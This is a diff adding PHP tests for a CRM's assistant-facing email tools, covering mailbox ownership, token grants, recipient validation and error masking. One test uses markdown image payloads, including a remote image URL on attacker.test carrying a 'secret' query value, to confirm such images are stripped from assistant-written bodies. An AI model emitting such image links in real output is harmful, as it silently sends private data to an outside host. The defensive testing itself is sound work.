@@ -21,6 +21,7 @@ use Illuminate\Support\Facades\Bus;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Str;
 use Illuminate\Testing\Fluent\AssertableJson;
+use Illuminate\Testing\TestResponse;
 use Laravel\Passport\Client;
 use Laravel\Passport\Passport;
 use Laravel\Pennant\Feature;
@@ -778,15 +779,43 @@ it('refuses a draft from a mailbox the caller does not own', function (): void {
     expect(Email::query()->where('status', EmailStatus::DRAFT)->count())->toBe(0);
 });
 
-it('refuses a draft in a mailbox that is no longer connected', function (): void {
-    $stale = ConnectedAccount::withoutEvents(fn () => ConnectedAccount::factory()->error()->create([
+it('refuses a draft in a mailbox that is disconnected', function (): void {
+    $disconnected = ConnectedAccount::withoutEvents(fn () => ConnectedAccount::factory()->disconnected()->create([
         'workspace_id' => $this->workspace->id,
         'user_id' => $this->viewer->id,
     ]));
 
     RelaticleServer::actingAs($this->viewer)
-        ->tool(CreateEmailDraftTool::class, draftArguments($stale))
-        ->assertHasErrors(["Mailbox with ID [{$stale->id}] not found."]);
+        ->tool(CreateEmailDraftTool::class, draftArguments($disconnected))
+        ->assertHasErrors(["Mailbox with ID [{$disconnected->id}] not found."]);
+
+    expect(Email::query()->where('status', EmailStatus::DRAFT)->count())->toBe(0);
+});
+
+it('accepts a draft in a mailbox in the error state and lists it as unable to send', function (): void {
+    $errored = ConnectedAccount::withoutEvents(fn () => ConnectedAccount::factory()->error()->create([
+        'workspace_id' => $this->workspace->id,
+        'user_id' => $this->viewer->id,
+    ]));
+
+    $data = emailToolData($this->viewer, CreateEmailDraftTool::class, draftArguments($errored));
+    $items = collect(emailToolData($this->viewer, ListEmailAccountsTool::class)['items'])->keyBy('id');
+
+    expect(Email::query()->findOrFail($data['id'])->connected_account_id)->toBe($errored->id)
+        ->and($items[$errored->id]['can_send'])->toBeFalse();
+});
+
+it('refuses a draft in the caller own mailbox of another workspace and does not list it', function (): void {
+    $elsewhere = ConnectedAccount::withoutEvents(fn () => ConnectedAccount::factory()->create([
+        'workspace_id' => Workspace::factory()->create()->id,
+        'user_id' => $this->viewer->id,
+    ]));
+
+    RelaticleServer::actingAs($this->viewer)
+        ->tool(CreateEmailDraftTool::class, draftArguments($elsewhere))
+        ->assertHasErrors(["Mailbox with ID [{$elsewhere->id}] not found."]);
+
+    expect(array_column(emailToolData($this->viewer, ListEmailAccountsTool::class)['items'], 'id'))->toBe([$this->viewerAccount->id]);
 });
 
 it('threads a reply draft onto an email the caller may view', function (): void {
@@ -798,6 +827,17 @@ it('threads a reply draft onto an email the caller may view', function (): void 
 
     expect($draft->in_reply_to)->toBe('<orig@acme.test>')
         ->and($draft->creation_source)->toBe(EmailCreationSource::REPLY);
+});
+
+it('stamps a reply draft as a plain assistant draft when the original has no message id to thread on', function (): void {
+    $original = ($this->emailFrom)($this->viewer, ['rfc_message_id' => null]);
+
+    $data = emailToolData($this->viewer, CreateEmailDraftTool::class, draftArguments($this->viewerAccount, ['in_reply_to_email_id' => $original->id]));
+
+    $draft = Email::query()->findOrFail($data['id']);
+
+    expect($draft->in_reply_to)->toBeNull()
+        ->and($draft->creation_source)->toBe(EmailCreationSource::MCP);
 });
 
 it('refuses a reply draft aimed at an email the caller may not view', function (): void {
@@ -823,6 +863,108 @@ it('lists the mailbox and draft tools only for a token that holds the draft gran
         ->and(listedToolNames($this->viewer, ['read', 'email:draft']))
         ->toContain('create-email-draft-tool', 'list-email-accounts-tool')
         ->not->toContain('list-emails-tool');
+});
+
+it('leaves the signature out of a draft that has no body', function (): void {
+    EmailSignature::factory()->default()->create([
+        'connected_account_id' => $this->viewerAccount->id,
+        'workspace_id' => $this->workspace->id,
+        'user_id' => $this->viewer->id,
+    ]);
+
+    $data = emailToolData($this->viewer, CreateEmailDraftTool::class, array_diff_key(draftArguments($this->viewerAccount), ['body' => true]));
+
+    expect(Email::query()->with('body')->findOrFail($data['id'])->body->body_html)
+        ->not->toContain('data-id="'.SignatureBlock::ID.'"');
+});
+
+it('refuses blank and oversized recipients in a draft', function (array $overrides): void {
+    RelaticleServer::actingAs($this->viewer)
+        ->tool(CreateEmailDraftTool::class, draftArguments($this->viewerAccount, ['subject' => null, 'body' => null, ...$overrides]))
+        ->assertHasErrors();
+
+    expect(Email::query()->where('status', EmailStatus::DRAFT)->count())->toBe(0);
+})->with([
+    'empty to' => [['to' => ['']]],
+    'blank to' => [['to' => [' ']]],
+    'empty cc' => [['cc' => ['']]],
+    'empty bcc' => [['bcc' => ['']]],
+    'address over 255 characters' => [['to' => [str_repeat('a', 250).'@acme.test']]],
+]);
+
+it('does not turn an unrelated runtime failure into a message for the client when drafting', function (): void {
+    config(['app.debug' => false]);
+    Email::creating(fn (): never => throw new ModelNotFoundException('internal detail'));
+
+    RelaticleServer::actingAs($this->viewer)
+        ->tool(CreateEmailDraftTool::class, draftArguments($this->viewerAccount))
+        ->assertHasErrors(['An internal server error occurred.']);
+
+    expect(Email::query()->where('status', EmailStatus::DRAFT)->count())->toBe(0);
+});
+
+it('replaces markdown images with their alt text in assistant bodies', function (string $image): void {
+    $arguments = ['body' => "See {$image} and [site](https://acme.test)"];
+
+    $draft = emailToolData($this->viewer, CreateEmailDraftTool::class, draftArguments($this->viewerAccount, $arguments));
+    $sent = emailToolData($this->viewer, SendEmailTool::class, sendArguments($this->viewerAccount, $arguments));
+
+    foreach ([$draft['id'], $sent['id']] as $id) {
+        expect(Email::query()->with('body')->findOrFail($id)->body->body_html)
+            ->not->toContain('<img')
+            ->not->toContain('attacker.test')
+            ->not->toContain('data:image')
+            ->toContain('See chart and')
+            ->toContain('<a href="https://acme.test">site</a>');
+    }
+})->with([
+    'remote image' => ['![chart](https://attacker.test/p.png?d=secret)'],
+    'data image' => ['![chart](data:image/png;base64,iVBORw0KGgo=)'],
+]);
+
+it('renders a deeply nested body quickly', function (): void {
+    $startedAt = microtime(true);
+
+    $data = emailToolData($this->viewer, CreateEmailDraftTool::class, draftArguments($this->viewerAccount, [
+        'body' => str_repeat('>', 49_999).'x',
+    ]));
+
+    expect($data['status'])->toBe('draft')
+        ->and(microtime(true) - $startedAt)->toBeLessThan(2.0);
+});
+
+function toolCallOverHttp(User $user, array $abilities, string $tool, array $arguments): TestResponse
+{
+    auth()->forgetGuards();
+
+    return test()
+        ->withToken($user->createToken('call-'.Str::random(6), $abilities)->plainTextToken)
+        ->postJson('/mcp', [
+            'jsonrpc' => '2.0',
+            'id' => 1,
+            'method' => 'tools/call',
+            'params' => ['name' => $tool, 'arguments' => $arguments],
+        ]);
+}
+
+it('refuses a draft call from a token without the draft grant', function (): void {
+    $response = toolCallOverHttp($this->viewer, ['read', 'email:read'], 'create-email-draft-tool', draftArguments($this->viewerAccount));
+
+    expect($response->json('error'))->not->toBeNull()
+        ->and(Email::query()->where('status', EmailStatus::DRAFT)->count())->toBe(0);
+});
+
+it('refuses a mailbox list call from a token without a draft or send grant', function (): void {
+    $response = toolCallOverHttp($this->viewer, ['read', 'email:read'], 'list-email-accounts-tool', []);
+
+    expect($response->json('error'))->not->toBeNull()
+        ->and($response->json('result'))->toBeNull();
+});
+
+it('lists the mailbox tool but not the draft tool for a token that holds only the send grant', function (): void {
+    expect(listedToolNames($this->viewer, ['read', 'email:send']))
+        ->toContain('list-email-accounts-tool')
+        ->not->toContain('create-email-draft-tool');
 });
 
 it('reads an html-only email whose style block is very large', function (): void {
@@ -1138,6 +1280,8 @@ it('rejects empty and wrongly typed arguments', function (array $overrides): voi
     'too many recipients' => [['to' => array_map(fn (int $number): string => "person{$number}@acme.test", range(1, 21))]],
     'subject as a list' => [['subject' => ['Next steps']]],
     'invalid cc' => [['cc' => ['nope']]],
+    'blank recipient' => [['to' => [' ']]],
+    'address over 255 characters' => [['to' => [str_repeat('a', 250).'@acme.test']]],
     'signature flag as text' => [['include_signature' => 'maybe']],
     'body over the limit' => [['body' => str_repeat('a', 50001)]],
 ]);
